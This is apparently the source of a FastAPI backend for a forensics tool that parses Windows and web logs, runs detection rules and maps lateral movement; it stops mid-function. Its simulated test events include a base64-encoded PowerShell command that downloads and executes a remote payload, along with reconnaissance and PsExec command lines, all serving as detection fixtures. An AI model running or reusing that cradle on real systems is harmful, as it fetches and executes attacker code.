"""
SIGIL Backend v4.0 — Case-First DFIR Compromise Assessment Tool API

Architecture: Case-first workflow with SQLite persistence.
Examiners must create a case before uploading files.
All events, findings, bookmarks, and LM data persist in sigil.db.
"""

from fastapi import FastAPI, UploadFile, File, Form, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, JSONResponse
from pydantic import BaseModel
from typing import Optional
import tempfile
import os
import json
import hashlib
import shutil
from datetime import datetime

from parser.evtx_parser import parse_evtx
from parser.web_log_parser import parse_web_logs
from parser.registry_parser import parse_registry
from detection.engine import run_detection, compute_overall_score, build_ioc_rules
from detection.rule_store import (
    init_db, get_all_rules, get_rules_by_type, get_rules_grouped,
    get_rule, create_rule, update_rule, delete_rule, toggle_rule,
    reset_to_defaults, get_stats
)
from detection.sigma_importer import convert_sigma_to_rules
from detection.report_generator import generate_report
from detection.lateral_movement import analyze_lateral_movement
from detection.process_tree import analyze_process_tree
from detection.case_db import (
    create_case_db, open_case_db,
    insert_artifact, get_artifact_by_hash, get_all_artifacts, update_artifact_status,
    insert_events_batch, get_events_by_artifact, get_all_events, get_event_count,
    clear_findings, insert_finding, insert_overall_score,
    get_all_findings, get_overall_score,
    toggle_bookmark, get_all_bookmarks,
    clear_lm_data, save_lm_results, get_lm_results,
)

app = FastAPI(title="SIGIL DFIR Backend", version="4.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Active Case State ─────────────────────────────────────────────────────────
_active_case = {
    "conn": None,           # SQLite connection
    "case_dir": None,       # Path to case folder
    "case_file": None,      # Path to case.sigil
    "metadata": None,       # Case metadata dict
}


def _get_conn():
    """Get the active case database connection."""
    if not _active_case["conn"]:
        raise HTTPException(status_code=400, detail="No case is open. Create or open a case first.")
    return _active_case["conn"]


@app.on_event("startup")
def startup():
    init_db()
    # Check for evtx_dump binary on startup
    from parser.evtx_parser import _find_evtx_dump
    evtx_path = _find_evtx_dump()
    if evtx_path:
        print(f"[SIGIL] ✓ evtx_dump ready: {evtx_path}")
    else:
        print(f"[SIGIL] ✗ evtx_dump not found — EVTX parsing will use python-evtx (much slower)")


@app.get("/health")
async def health():
    """Health check endpoint."""
    has_case = _active_case["conn"] is not None
    return {"status": "ok", "version": "4.0.0", "case_active": has_case}


# ═══ HELPER: File parsing ═══

def _load_events_from_jsonl(jsonl_path: str, event_ids: set = None) -> list[dict]:
    """Load events from a JSONL file, optionally filtering by event_id."""
    events = []
    if not os.path.exists(jsonl_path):
        return events
    with open(jsonl_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                ev = json.loads(line)
                if event_ids and str(ev.get("event_id", "")) not in event_ids:
                    continue
                events.append(ev)
            except json.JSONDecodeError:
                continue
    return events


def _load_all_case_events(conn, event_ids: set = None) -> list[dict]:
    """Load events from all artifact JSONL files in the case."""
    artifacts = get_all_artifacts(conn)
    all_events = []
    for a in artifacts:
        jsonl_path = a.get("file_path", "")
        if jsonl_path and os.path.exists(jsonl_path):
            events = _load_events_from_jsonl(jsonl_path, event_ids)
            all_events.extend(events)
    return all_events

def _decode_text(raw: bytes) -> str:
    if raw[:2] in (b'\xff\xfe', b'\xfe\xff') or (len(raw) > 2 and raw[1:2] == b'\x00'):
        try:
            return raw.decode("utf-16")
        except UnicodeDecodeError:
            pass
    try:
        return raw.decode("utf-8", errors="replace")
    except Exception:
        return raw.decode("latin-1", errors="replace")


def detect_log_type(content: str, filename: str) -> str:
    fn = filename.lower()
    if fn.endswith((".evtx", ".evt")):
        return "windows_event_log"
    if fn.endswith(".reg"):
        return "registry"
    if any(fn.endswith(ext) for ext in (".log", ".txt", ".csv")):
        sample = content[:2000].lower()
        if any(marker in sample for marker in ["iis", "w3svc", "cs-uri", "sc-status",
                                                 "apache", "nginx", "http/1.", "get /", "post /"]):
            return "web_server_log"
        if any(marker in sample for marker in ["eventid", "event_id", "provider",
                                                 "security-auditing", "sysmon"]):
            return "windows_event_log"
    return "web_server_log"


def parse_file(content, log_type, tmp_path=None, filename=""):
    if log_type == "windows_event_log" and tmp_path:
        events = parse_evtx(tmp_path)
        return {"events": events, "log_type": log_type, "format": "evtx",
                "event_count": len(events)}
    elif log_type == "registry":
        result = parse_registry(content)
        events = result.get("events", []) if isinstance(result, dict) else result
        return {"events": events, "log_type": log_type, "format": "registry",
                "event_count": len(events)}
    else:
        result = parse_web_logs(content)
        events = result.get("events", []) if isinstance(result, dict) else result
        fmt = result.get("format", "Apache/Nginx") if isinstance(result, dict) else "Apache/Nginx"
        return {"events": events, "log_type": log_type, "format": fmt,
                "event_count": len(events)}


# ═══ CASE MANAGEMENT ═══

class CaseCreateRequest(BaseModel):
    case_name: str
    examiner: str
    organization: Optional[str] = ""
    description: Optional[str] = ""
    save_path: str  # Folder path where case folder will be created


@app.post("/case/create")
async def case_create(req: CaseCreateRequest):
    """Create a new case folder with case.sigil and sigil.db."""
    try:
        # Close any existing case
        if _active_case["conn"]:
            _active_case["conn"].close()
            _active_case["conn"] = None

        # Create safe folder name
        safe_name = "".join(c if c.isalnum() or c in "-_ " else "_" for c in req.case_name).strip()
        case_dir = os.path.join(req.save_path, safe_name)
        os.makedirs(case_dir, exist_ok=True)
        os.makedirs(os.path.join(case_dir, "reports"), exist_ok=True)

        # Create case.sigil metadata
        metadata = {
            "version": "2.0.0",
            "case_name": req.case_name,
            "examiner": req.examiner,
            "organization": req.organization or "",
            "description": req.description or "",
            "created_at": datetime.utcnow().isoformat(),
            "updated_at": datetime.utcnow().isoformat(),
            "db_file": "sigil.db",
        }
        case_file = os.path.join(case_dir, "case.sigil")
        with open(case_file, "w") as f:
            json.dump(metadata, f, indent=2)

        # Create SQLite database
        db_path = os.path.join(case_dir, "sigil.db")
        conn = create_case_db(db_path)

        _active_case["conn"] = conn
        _active_case["case_dir"] = case_dir
        _active_case["case_file"] = case_file
        _active_case["metadata"] = metadata

        print(f"[SIGIL] Case created: {req.case_name} at {case_dir}")
        return {"status": "success", "case_dir": case_dir, "metadata": metadata}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.post("/case/open")
async def case_open(case_path: str = Form(...)):
    """Open an existing case from a case.sigil file path."""
    try:
        if _active_case["conn"]:
            _active_case["conn"].close()
            _active_case["conn"] = None

        if not os.path.exists(case_path):
            return {"status": "error", "message": f"File not found: {case_path}"}

        # Determine if path is to case.sigil or the case directory
        if os.path.isdir(case_path):
            case_dir = case_path
            case_file = os.path.join(case_dir, "case.sigil")
        else:
            case_file = case_path
            case_dir = os.path.dirname(case_path)

        if not os.path.exists(case_file):
            return {"status": "error", "message": f"case.sigil not found in {case_dir}"}

        with open(case_file, "r") as f:
            metadata = json.load(f)

        db_path = os.path.join(case_dir, metadata.get("db_file", "sigil.db"))
        conn = open_case_db(db_path)

        _active_case["conn"] = conn
        _active_case["case_dir"] = case_dir
        _active_case["case_file"] = case_file
        _active_case["metadata"] = metadata

        # Load existing data counts
        artifacts = get_all_artifacts(conn)
        event_count = sum(a.get("event_count", 0) for a in artifacts)
        findings = get_all_findings(conn)
        score = get_overall_score(conn)
        bookmarks = get_all_bookmarks(conn)
        lm_results = get_lm_results(conn)

        print(f"[SIGIL] Case opened: {metadata.get('case_name', '?')} — "
              f"{len(artifacts)} artifacts, {event_count} events, {len(findings)} findings")

        return {
            "status": "success",
            "case_dir": case_dir,
            "metadata": metadata,
            "artifacts": artifacts,
            "event_count": event_count,
            "findings": findings,
            "overall_score": score,
            "bookmarks": list(bookmarks),
            "lm_results": lm_results,
        }
    except Exception as e:
        import traceback
        return {"status": "error", "message": str(e), "trace": traceback.format_exc()}


@app.get("/case/info")
async def case_info():
    """Get current case info (for recovery after refresh)."""
    if not _active_case["metadata"]:
        return {"status": "no_case"}

    conn = _active_case["conn"]
    artifacts = get_all_artifacts(conn) if conn else []
    event_count = sum(a.get("event_count", 0) for a in artifacts) if conn else 0
    findings = get_all_findings(conn) if conn else []
    score = get_overall_score(conn) if conn else None
    bookmarks = get_all_bookmarks(conn) if conn else set()
    lm_results = get_lm_results(conn) if conn else None

    return {
        "status": "active",
        "case_dir": _active_case["case_dir"],
        "metadata": _active_case["metadata"],
        "artifacts": artifacts,
        "event_count": event_count,
        "findings": findings,
        "overall_score": score,
        "bookmarks": list(bookmarks),
        "lm_results": lm_results,
    }


@app.post("/case/close")
async def case_close():
    """Close the current case."""
    if _active_case["conn"]:
        # Update case metadata
        if _active_case["case_file"] and _active_case["metadata"]:
            _active_case["metadata"]["updated_at"] = datetime.utcnow().isoformat()
            with open(_active_case["case_file"], "w") as f:
                json.dump(_active_case["metadata"], f, indent=2)

        _active_case["conn"].close()
        _active_case["conn"] = None
        _active_case["case_dir"] = None
        _active_case["case_file"] = None
        _active_case["metadata"] = None
        print("[SIGIL] Case closed")
    return {"status": "success"}


@app.post("/case/browse-folder")
async def browse_folder():
    """Open native folder picker dialog. Returns selected path."""
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        folder = filedialog.askdirectory(title="Select folder for case")
        root.destroy()
        if folder:
            return {"status": "success", "path": folder}
        return {"status": "cancelled"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.post("/case/browse-file")
async def browse_file():
    """Open native file picker for .sigil files."""
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        filepath = filedialog.askopenfilename(
            title="Open SIGIL Case",
            filetypes=[("SIGIL Case", "*.sigil"), ("All Files", "*.*")]
        )
        root.destroy()
        if filepath:
            return {"status": "success", "path": filepath}
        return {"status": "cancelled"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ═══ ARTIFACT UPLOAD & PARSING ═══

@app.post("/case/upload")
async def case_upload(file: UploadFile = File(...)):
    """Upload and parse a file. EVTX files are dumped to JSONL in the case folder.
    Only artifact metadata is stored in SQLite — events stay in JSONL files."""
    conn = _get_conn()
    try:
        raw = await file.read()
        filename = file.filename or "unknown"

        # Hash the file
        md5 = hashlib.md5(raw).hexdigest()
        sha1 = hashlib.sha1(raw).hexdigest()
        sha256 = hashlib.sha256(raw).hexdigest()

        # Check for duplicates
        existing = get_artifact_by_hash(conn, sha256)
        if existing:
            return {
                "status": "duplicate",
                "message": f"File already uploaded: {existing['filename']}",
                "artifact": existing,
            }

        # Parse the file
        tmp_path = None
        if filename.lower().endswith((".evtx", ".evt")):
            with tempfile.NamedTemporaryFile(delete=False, suffix=".evtx") as tmp:
                tmp.write(raw)
                tmp_path = tmp.name
            content = ""
        else:
            content = _decode_text(raw)

        log_type = detect_log_type(content, filename)
        parsed = parse_file(content, log_type, tmp_path, filename)
        if tmp_path and os.path.exists(tmp_path):
            os.remove(tmp_path)
        events = parsed["events"]

        # Save parsed events as JSONL in case folder (fast file I/O, no SQLite bottleneck)
        data_dir = os.path.join(_active_case["case_dir"], "data")
        os.makedirs(data_dir, exist_ok=True)
        jsonl_filename = f"{sha256[:12]}_{filename}.jsonl"
        jsonl_path = os.path.join(data_dir, jsonl_filename)

        with open(jsonl_path, "w", encoding="utf-8") as jf:
            for ev in events:
                jf.write(json.dumps(ev, default=str) + "\n")

        # Insert only artifact metadata into SQLite (fast)
        artifact_id = insert_artifact(
            conn, filename, len(raw), md5, sha1, sha256,
            log_type, parsed.get("format", "")
        )
        # Store JSONL path in artifact record
        conn.execute("UPDATE artifacts SET file_path = ? WHERE id = ?", (jsonl_path, artifact_id))
        conn.commit()
        update_artifact_status(conn, artifact_id, "parsed", len(events))

        print(f"[SIGIL] Uploaded: {filename} → {len(events)} events saved to {jsonl_filename}")

        artifact = get_artifact_by_hash(conn, sha256)

        return {
            "status": "success",
            "artifact": artifact,
            "log_type": log_type,
            "format": parsed.get("format", ""),
            "event_count": len(events),
            "events": events[:5000],  # Preview only
            "hashes": {"md5": md5, "sha1": sha1, "sha256": sha256, "file_size": len(raw)},
        }
    except Exception as e:
        import traceback
        return {"status": "error", "message": str(e), "trace": traceback.format_exc()}


# ═══ ANALYSIS (Detection Engine) ═══

@app.post("/case/analyze")
async def case_analyze(
    ioc_list: Optional[str] = Form(None),
    ioc_enabled: Optional[bool] = Form(True),
    force_reanalyze: Optional[bool] = Form(False)
):
    """Run detection on new artifacts only. Previously analyzed artifacts are skipped.
    Set force_reanalyze=true to re-process all artifacts from scratch."""
    conn = _get_conn()
    try:
        artifacts = get_all_artifacts(conn)
        if not artifacts:
            return {"status": "error", "message": "No artifacts uploaded yet"}

        if force_reanalyze:
            # Full re-analysis: clear everything and process all artifacts
            clear_findings(conn)
            pending_artifacts = artifacts
            print("[SIGIL] Force re-analyze: processing all artifacts")
        else:
            # Incremental: only process artifacts not yet analyzed
            pending_artifacts = [a for a in artifacts if a.get("status") != "complete"]
            if not pending_artifacts:
                # Nothing new to analyze — return existing findings
                stored_findings = get_all_findings(conn)
                overall_score = get_overall_score(conn)
                return {
                    "status": "success",
                    "findings": stored_findings,
                    "overall_score": overall_score or {"label": "CLEAN", "color": "#10b981", "score": 0},
                    "total_events": sum(a.get("event_count", 0) for a in artifacts),
                    "artifacts_analyzed": len(artifacts),
                    "message": "All artifacts already analyzed. No new files to process.",
                }
            print(f"[SIGIL] Incremental analyze: {len(pending_artifacts)} new artifact(s), "
                  f"{len(artifacts) - len(pending_artifacts)} already complete")

        new_findings = []
        total_new_events = 0

        # Run detection on pending artifacts only
        for artifact in pending_artifacts:
            jsonl_path = artifact.get("file_path", "")
            if not jsonl_path or not os.path.exists(jsonl_path):
                update_artifact_status(conn, artifact["id"], "complete")
                continue

            events = _load_events_from_jsonl(jsonl_path)
            if not events:
                update_artifact_status(conn, artifact["id"], "complete")
                continue

            total_new_events += len(events)
            log_type = artifact["log_type"]

            # Get rules for this log type
            rules = get_rules_by_type(log_type)

            # IOC rules
            ioc_rules = None
            if ioc_enabled and ioc_list:
                try:
                    iocs = json.loads(ioc_list)
                    if iocs:
                        ioc_rules = build_ioc_rules(iocs)
                except (json.JSONDecodeError, TypeError):
                    pass

            # Run detection
            findings = run_detection(events, log_type, rules, ioc_rules)

            # Store findings in SQLite
            for f in findings:
                f["source"] = artifact["filename"]
                insert_finding(conn, f)
                new_findings.append(f)

            update_artifact_status(conn, artifact["id"], "complete")
            print(f"[SIGIL] Analyzed {artifact['filename']}: {len(findings)} findings from {len(events)} events")

        # Recompute overall score from ALL findings (existing + new)
        all_findings = get_all_findings(conn)
        overall_score = compute_overall_score(all_findings)
        insert_overall_score(conn, overall_score)

        # Update case metadata timestamp
        if _active_case["metadata"]:
            _active_case["metadata"]["updated_at"] = datetime.utcnow().isoformat()
            with open(_active_case["case_file"], "w") as f:
                json.dump(_active_case["metadata"], f, indent=2)

        # Return findings from database (with matched events and bookmarks)
        stored_findings = get_all_findings(conn)
        total_events = sum(a.get("event_count", 0) for a in artifacts)

        print(f"[SIGIL] Analysis complete: {len(stored_findings)} findings ({len(new_findings)} new), "
              f"{total_new_events} new events processed, {total_events} total events, score: {overall_score['label']}")

        return {
            "status": "success",
            "findings": stored_findings,
            "overall_score": overall_score,
            "total_events": total_events,
            "artifacts_analyzed": len(artifacts),
            "new_artifacts_analyzed": len(pending_artifacts),
        }
    except Exception as e:
        import traceback
        return {"status": "error", "message": str(e), "trace": traceback.format_exc()}


# ═══ BOOKMARKS ═══

@app.post("/case/bookmark")
async def case_bookmark(request: Request):
    """Toggle a bookmark on a finding event."""
    conn = _get_conn()
    body = await request.json()
    finding_id = body.get("finding_id")
    event_id = body.get("event_id")
    if finding_id is None or event_id is None:
        return {"status": "error", "message": "finding_id and event_id required"}

    added = toggle_bookmark(conn, finding_id, event_id)
    return {"status": "success", "bookmarked": added}


@app.get("/case/bookmarks")
async def case_bookmarks():
    """Get all bookmarks."""
    conn = _get_conn()
    bookmarks = get_all_bookmarks(conn)
    return {"status": "success", "bookmarks": list(bookmarks)}


# ═══ LATERAL MOVEMENT ═══

@app.post("/case/lateral-movement")
async def case_lateral_movement(request: Request):
    """Run lateral movement analysis by reading events from JSONL files."""
    conn = _get_conn()
    try:
        body = await request.json()
        target_eids = set(body.get("target_eids", []))

        # Load events from JSONL files, filtered by target EventIDs
        events = _load_all_case_events(conn, event_ids=target_eids if target_eids else None)

        print(f"[SIGIL] LM: Loaded {len(events)} events from JSONL (EIDs: {len(target_eids) if target_eids else 'all'})")

        result = analyze_lateral_movement(events, target_eids if target_eids else None)

        # Save results to SQLite for persistence
        save_lm_results(conn, result, target_eids)

        print(f"[SIGIL] LM: {result['summary']['total_logons']} logons, "
              f"{result['summary']['unique_sources']} sources, "
              f"{len(result.get('findings', []))} findings — saved to SQLite")

        return {"status": "success", **result}
    except Exception as e:
        import traceback
        return {"status": "error", "message": str(e), "trace": traceback.format_exc()}


@app.get("/case/lm-results")
async def case_lm_results():
    """Get stored lateral movement results."""
    conn = _get_conn()
    results = get_lm_results(conn)
    if results:
        return {"status": "success", **results}
    return {"status": "no_data"}


# ═══ PROCESS INSPECTOR ═══

@app.post("/case/process-tree")
async def case_process_tree():
    """Build process tree from Sysmon EID 1 and Security EID 4688 events."""
    conn = _get_conn()
    try:
        events = _load_all_case_events(conn, event_ids={"1", "4688"})
        print(f"[SIGIL] Process tree: Loaded {len(events)} process creation events from JSONL")

        result = analyze_process_tree(events)

        print(f"[SIGIL] Process tree: {result['summary']['total_processes']} processes, "
              f"{result['summary']['total_findings']} findings "
              f"({result['summary']['critical_count']} critical, {result['summary']['high_count']} high)")

        return {"status": "success", **result}
    except Exception as e:
        import traceback
        return {"status": "error", "message": str(e), "trace": traceback.format_exc()}


# ═══ DEBUG: Inspect events ═══

@app.get("/case/debug-events")
async def debug_events(event_id: str = "4688", limit: int = 3):
    """Show sample events for debugging field names."""
    conn = _get_conn()
    events = _load_all_case_events(conn, event_ids={event_id})
    samples = []
    for ev in events[:limit]:
        samples.append({
            "event_id": ev.get("event_id"),
            "provider": ev.get("provider"),
            "computer": ev.get("computer"),
            "timestamp": ev.get("timestamp"),
            "fields": ev.get("fields", {}),
            "fields_keys": list(ev.get("fields", {}).keys()) if isinstance(ev.get("fields"), dict) else str(type(ev.get("fields"))),
        })
    return {"status": "success", "count": len(events), "samples": samples}


# ═══ REPORT GENERATION ═══

@app.post("/case/report")
async def case_report(request: Request):
    """Generate DOCX report from frontend-provided data."""
    conn = _get_conn()
    try:
        body = await request.json()

        # Use frontend-provided data (already filtered by mode)
        case_meta = body.get("case_meta", {})
        if not case_meta.get("case_name") and _active_case["metadata"]:
            case_meta["case_name"] = _active_case["metadata"].get("case_name", "SIGIL Case")
            case_meta["examiner"] = _active_case["metadata"].get("examiner", "")
            case_meta["organization"] = _active_case["metadata"].get("organization", "")

        findings = body.get("findings", [])
        overall_score = body.get("overall_score") or {"label": "CLEAN", "color": "#10b981", "score": 0}
        artifacts = body.get("artifacts", [])
        
        # Fall back to DB artifacts if frontend didn't send them
        if not artifacts:
            db_artifacts = get_all_artifacts(conn)
            artifacts = [{"name": a["filename"], "log_type": a["log_type"],
                          "event_count": a.get("event_count", 0), "size": a.get("file_size", 0),
                          "hashes": {"md5": a.get("md5", ""), "sha1": a.get("sha1", ""),
                                     "sha256": a.get("sha256", ""), "file_size": a.get("file_size", 0)}}
                         for a in db_artifacts]

        buffer = generate_report(
            case_meta=case_meta,
            findings=findings,
            overall_score=overall_score,
            artifacts=artifacts,
        )

        case_name = case_meta.get("case_name", "SIGIL_Report")
        safe_name = "".join(c if c.isalnum() or c in "-_ " else "_" for c in case_name)
        filename = f"{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.docx"

        # Save to case reports folder
        if _active_case.get("case_dir"):
            reports_dir = os.path.join(_active_case["case_dir"], "reports")
            os.makedirs(reports_dir, exist_ok=True)
            report_path = os.path.join(reports_dir, filename)
            with open(report_path, "wb") as f:
                f.write(buffer.getvalue())
            buffer.seek(0)
            print(f"[SIGIL] Report saved: {report_path}")

        return StreamingResponse(
            buffer,
            media_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            headers={"Content-Disposition": f"attachment; filename={filename}"}
        )
    except Exception as e:
        import traceback
        raise HTTPException(status_code=500, detail=f"Report generation failed: {str(e)}")


# ═══ DETECTION RULES (kept from v3) ═══

@app.get("/rules")
async def list_rules():
    rules = get_rules_grouped()
    stats = get_stats()
    return {"status": "success", "rules": rules, "stats": stats}

@app.get("/rules/{rule_id}")
async def get_single_rule(rule_id: str):
    rule = get_rule(rule_id)
    if not rule:
        raise HTTPException(status_code=404, detail="Rule not found")
    return {"status": "success", "rule": rule}

@app.post("/rules")
async def create_new_rule(request: Request):
    body = await request.json()
    rule_id = create_rule(body)
    return {"status": "success", "id": rule_id}

@app.put("/rules/{rule_id}")
async def update_existing_rule(rule_id: str, request: Request):
    body = await request.json()
    update_rule(rule_id, body)
    return {"status": "success"}

@app.delete("/rules/{rule_id}")
async def delete_existing_rule(rule_id: str):
    delete_rule(rule_id)
    return {"status": "success"}

@app.post("/rules/{rule_id}/toggle")
async def toggle_existing_rule(rule_id: str):
    new_state = toggle_rule(rule_id)
    return {"status": "success", "enabled": new_state}

@app.post("/rules/reset")
async def reset_rules():
    reset_to_defaults()
    return {"status": "success"}

@app.post("/rules/import-sigma")
async def import_sigma(file: UploadFile = File(...)):
    try:
        content = await file.read()
        yaml_text = content.decode("utf-8")
        converted = convert_sigma_to_rules(yaml_text)
        if not converted:
            return {"status": "error", "message": "No valid Sigma rules found"}
        created_ids = []
        skipped = 0
        for rule in converted:
            try:
                rule_id = create_rule(rule)
                created_ids.append(rule_id)
            except Exception:
                skipped += 1
        return {"status": "success", "imported": len(created_ids), "skipped": skipped}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ═══ TEST DATA: Simulated lateral movement scenario ═══

@app.post("/case/test-lateral-movement")
async def test_lateral_movement():
    """Inject simulated lateral movement events for testing the visualization."""
    conn = _get_conn()
    try:
        artifact_id = insert_artifact(
            conn, "simulated_security.evtx", 0,
            "test", "test", f"test_{datetime.utcnow().timestamp()}",
            "windows_event_log", "evtx"
        )

        events = []
        base = "2024-11-12T"

        def ev(eid, ts, src, comp, user, lt="", **kw):
            fields = {"TargetUserName": user, "IpAddress": src, "LogonType": lt, "SubjectUserName": kw.get("subj", "-")}
            if kw.get("svc"): fields["ServiceName"] = kw["svc"]
            if kw.get("share"): fields["ShareName"] = kw["share"]
            if kw.get("proc"): fields["ProcessName"] = kw["proc"]
            if kw.get("tenc"): fields["TicketEncryptionType"] = kw["tenc"]
            if not any(c.isdigit() for c in src[:2]): fields["WorkstationName"] = src
            content = f"EventID: {eid} Computer: {comp} " + " ".join(f"{k}:{v}" for k,v in fields.items() if v and v != "-")
            return {"event_id": eid, "provider": "Simulated", "channel": "Security", "computer": comp,
                    "timestamp": ts, "record_id": f"S{hash(ts+eid+comp)%999999}", "content": content,
                    "message": content, "fields": fields, "event_data_xml": ""}

        # Phase 1: Brute force WORKSTATION-01
        for i in range(8):
            events.append(ev("4625", f"{base}07:{10+i:02d}:00Z", "10.10.5.99", "WORKSTATION-01", "admin"))
        events.append(ev("4624", f"{base}07:19:00Z", "10.10.5.99", "WORKSTATION-01", "admin", "3"))
        events.append(ev("4672", f"{base}07:19:01Z", "10.10.5.99", "WORKSTATION-01", "admin", subj="admin"))

        # Phase 2: Kerberoasting from WORKSTATION-01
        for i in range(15):
            events.append(ev("4769", f"{base}07:{25+i}:00Z", "WORKSTATION-01", "DC01", f"svc_{i}", tenc="0x17"))

        # Phase 3: PsExec to FILESERVER + smbexec
        events.append(ev("4648", f"{base}07:45:00Z", "WORKSTATION-01", "FILESERVER", "admin", "3", subj="attacker"))
        events.append(ev("4624", f"{base}07:45:01Z", "WORKSTATION-01", "FILESERVER", "admin", "3"))
        events.append(ev("7045", f"{base}07:45:02Z", "WORKSTATION-01", "FILESERVER", "SYSTEM", svc="qyrvrfld"))
        events.append(ev("4688", f"{base}07:45:03Z", "WORKSTATION-01", "FILESERVER", "admin", proc="C:\\Windows\\psexecsvc.exe"))
        events.append(ev("5145", f"{base}07:45:04Z", "WORKSTATION-01", "FILESERVER", "admin", "3", share="\\\\*\\ADMIN$"))
        events.append(ev("5145", f"{base}07:45:05Z", "WORKSTATION-01", "FILESERVER", "admin", "3", share="\\\\*\\C$"))

        # Phase 4: Pivot FILESERVER → DC01
        events.append(ev("4648", f"{base}08:00:00Z", "FILESERVER", "DC01", "domain_admin", "3", subj="admin"))
        events.append(ev("4624", f"{base}08:00:01Z", "FILESERVER", "DC01", "domain_admin", "3"))
        events.append(ev("4672", f"{base}08:00:02Z", "FILESERVER", "DC01", "domain_admin", subj="domain_admin"))
        events.append(ev("5145", f"{base}08:00:03Z", "FILESERVER", "DC01", "domain_admin", "3", share="\\\\*\\ADMIN$"))

        # Phase 5: DC01 → SQLSERVER via RDP
        events.append(ev("4624", f"{base}08:15:00Z", "DC01", "SQLSERVER", "domain_admin", "10"))
        events.append(ev("1149", f"{base}08:15:01Z", "DC01", "SQLSERVER", "domain_admin"))
        events.append(ev("21", f"{base}08:15:02Z", "DC01", "SQLSERVER", "domain_admin"))
        events.append(ev("22", f"{base}08:15:03Z", "DC01", "SQLSERVER", "domain_admin"))

        # Phase 6: DC01 → BACKUPSVR cleartext logon
        events.append(ev("4624", f"{base}08:30:00Z", "DC01", "BACKUPSVR", "backup_svc", "8"))
        events.append(ev("5140", f"{base}08:30:01Z", "DC01", "BACKUPSVR", "backup_svc", "3", share="\\\\*\\Backups$"))

        # Phase 7: Second attacker → DC01
        for i in range(5):
            events.append(ev("4625", f"{base}09:{i*2:02d}:00Z", "10.10.99.200", "DC01", "administrator"))
        events.append(ev("4624", f"{base}09:12:00Z", "10.10.99.200", "DC01", "administrator", "3"))

        # Phase 8: SQLSERVER → DEVBOX via WMI
        events.append(ev("4648", f"{base}09:30:00Z", "SQLSERVER", "DEVBOX", "dev_user", "3", subj="domain_admin"))
        events.append(ev("4624", f"{base}09:30:01Z", "SQLSERVER", "DEVBOX", "dev_user", "3"))
        events.append(ev("5861", f"{base}09:30:02Z", "SQLSERVER", "DEVBOX", "dev_user"))

        # Phase 9: DEVBOX → HRSERVER failed
        for i in range(4):
            events.append(ev("4625", f"{base}10:{i*3:02d}:00Z", "DEVBOX", "HRSERVER", "hr_admin"))

        # Phase 10: WORKSTATION-01 → DC01 direct
        events.append(ev("4624", f"{base}10:30:00Z", "WORKSTATION-01", "DC01", "admin", "3"))
        events.append(ev("5145", f"{base}10:30:01Z", "WORKSTATION-01", "DC01", "admin", "3", share="\\\\*\\C$"))

        # ── Process creation events (for Process Inspector) ──
        def proc(ts, comp, ppid, pid, parent_name, new_proc, cmd, user="admin", integrity="Medium"):
            return {"event_id": "4688", "provider": "Microsoft-Windows-Security-Auditing",
                    "channel": "Security", "computer": comp, "timestamp": ts,
                    "record_id": f"P{hash(ts+new_proc)%999999}",
                    "content": f"EventID: 4688 NewProcessName: {new_proc} CommandLine: {cmd}",
                    "message": f"New process: {new_proc}", "event_data_xml": "",
                    "fields": {"NewProcessId": pid, "ProcessId": ppid,
                               "NewProcessName": new_proc, "ParentProcessName": parent_name,
                               "CommandLine": cmd, "SubjectUserName": user,
                               "SubjectDomainName": "CORP",
                               "MandatoryLabel": f"Mandatory Label\\{integrity} Mandatory Level"}}

        # Attack chain: Word → PowerShell → cmd → whoami
        events.append(proc(f"{base}07:05:00Z", "WORKSTATION-01", "0x1234", "0x2000",
            "C:\\Program Files\\Microsoft Office\\winword.exe",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkACcAKQA="))
        events.append(proc(f"{base}07:05:02Z", "WORKSTATION-01", "0x2000", "0x2100",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c whoami /all && ipconfig /all && net user"))
        events.append(proc(f"{base}07:05:03Z", "WORKSTATION-01", "0x2100", "0x2200",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\whoami.exe",
            "whoami /all"))
        events.append(proc(f"{base}07:05:04Z", "WORKSTATION-01", "0x2100", "0x2201",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\ipconfig.exe",
            "ipconfig /all"))
        events.append(proc(f"{base}07:05:05Z", "WORKSTATION-01", "0x2100", "0x2202",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\net.exe",
            "net user /domain"))

        # PsExec service spawning cmd on FILESERVER
        events.append(proc(f"{base}07:46:00Z", "FILESERVER", "0x004", "0x3000",
            "C:\\Windows\\System32\\services.exe",
            "C:\\Windows\\psexecsvc.exe",
            "C:\\Windows\\psexecsvc.exe", user="SYSTEM", integrity="System"))
        events.append(proc(f"{base}07:46:01Z", "FILESERVER", "0x3000", "0x3100",
            "C:\\Windows\\psexecsvc.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c echo aaaa > \\\\FILESERVER\\pipe\\psexecsvc"))
        events.append(proc(f"{base}07:46:02Z", "FILESERVER", "0x3100", "0x3200",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\powershell.exe",
